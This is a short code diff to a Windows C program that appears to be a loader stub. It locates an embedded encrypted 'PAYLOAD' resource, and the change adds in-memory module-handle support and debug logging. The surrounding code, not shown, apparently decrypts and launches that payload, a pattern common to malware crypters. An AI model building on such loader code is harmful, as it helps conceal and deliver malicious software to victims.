@@ -36,6 +36,8 @@ int plugin_fire_stage(int stage);
 #endif
 
 HMODULE g_hDll = NULL;
+// Module handle for the stub itself (set by template.c when loaded in-memory)
+HMODULE g_hStubModule = NULL;
 // Named event handle to allow cooperative shutdown (can be signaled externally)
 HANDLE g_exit_event = NULL;
 
@@ -246,7 +248,11 @@ int main(int argc, char *argv[]) {
     ZeroMemory(&pi, sizeof(pi));
     unsigned char *decrypted_payload = NULL;
 
-    HMODULE hModule = GetModuleHandle(NULL);
+    // Use g_hStubModule if set (in-memory mode), otherwise get from process
+    HMODULE hModule = g_hStubModule ? g_hStubModule : GetModuleHandle(NULL);
+    char dbg_mod[128];
+    snprintf(dbg_mod, sizeof(dbg_mod), "hModule=%p g_hStubModule=%p GetModuleHandle(NULL)=%p", (void*)hModule, (void*)g_hStubModule, (void*)GetModuleHandle(NULL));
+    write_debug(dbg_mod);
     hConfigRes = FindResource(hModule, "CONFIG", "PAYLOAD");
     if (hConfigRes) {
         hData = LoadResource(hModule, hConfigRes);
